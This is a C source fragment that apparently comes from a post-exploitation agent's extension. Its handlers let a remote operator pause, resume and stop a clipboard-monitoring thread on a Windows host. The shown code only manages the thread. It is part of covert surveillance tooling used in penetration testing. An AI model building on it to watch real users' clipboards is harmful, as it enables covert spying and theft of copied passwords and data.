DWORD clipboard_monitor_resume(ClipboardState* pState)
{
	if (!pState->bRunning)
	{
		event_signal(pState->hResumeEvent);
		event_poll(pState->hResponseEvent, INFINITE);
	}

	return ERROR_SUCCESS;
}

DWORD request_clipboard_monitor_pause(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
		}

		dprintf("[EXTAPI CLIPBOARD] Pausing clipboard monitor");

		dwResult = clipboard_monitor_pause(gClipboardState);
	} while (0);

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD request_clipboard_monitor_resume(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
		}

		dprintf("[EXTAPI CLIPBOARD] Resuming clipboard monitor");

		dwResult = clipboard_monitor_resume(gClipboardState);
	} while (0);

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}

DWORD request_clipboard_monitor_stop(Remote *remote, Packet *packet)
{
#ifdef _WIN32
	DWORD dwResult = ERROR_SUCCESS;

	do
	{
		if (gClipboardState == NULL)
		{
			BREAK_WITH_ERROR("[EXTAPI CLIPBOARD] Monitor thread isn't running", ERROR_NOTHING_TO_TERMINATE);
		}

		dprintf("[EXTAPI CLIPBOARD] Starting clipboard monitor");

		// resume in case we're paused
		clipboard_monitor_resume(gClipboardState);

		// now stop the show
		event_signal(gClipboardState->hThread->sigterm);

		// if they don't terminate in a reasonable period of time...
		if (!event_poll(gClipboardState->hResponseEvent, 10000))
		{
			// ... FINISH HIM!
			dprintf("[EXTAPI CLIPBOARD] Brutally terminating the thread for not responding fast enough");
			thread_kill(gClipboardState->hThread);
		}

		destroy_clipboard_monitor_state(gClipboardState);
		gClipboardState = NULL;
		dwResult = ERROR_SUCCESS;
	} while (0);

	packet_transmit_empty_response(remote, packet, dwResult);

	return dwResult;
#else
	return ERROR_NOT_SUPPORTED;
#endif
}